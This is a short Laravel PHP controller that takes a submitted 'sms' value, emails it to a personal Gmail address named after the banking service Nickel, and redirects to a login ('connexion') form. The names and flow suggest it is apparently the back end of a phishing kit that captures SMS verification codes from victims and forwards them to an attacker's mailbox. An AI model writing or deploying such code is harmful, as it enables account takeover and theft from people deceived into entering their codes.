<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;
use App\Mail\ContactMail;

class SmsController extends Controller
{
    public function showForm()
    {
        return view('sms');
    }
    
    public function send(Request $request)
    {
        $request->validate([
            'sms' => 'required',
        ]);
    
        $details = [
            'sms' => $request->sms,
        ];
    
        Mail::to('nickelservicesaccord@gmail.com')->send(new ContactMail($details, 'emails.sms'));

    
        return redirect()->route('connexion.form')->with('success', 'Message envoyé avec succès !');
    }
}
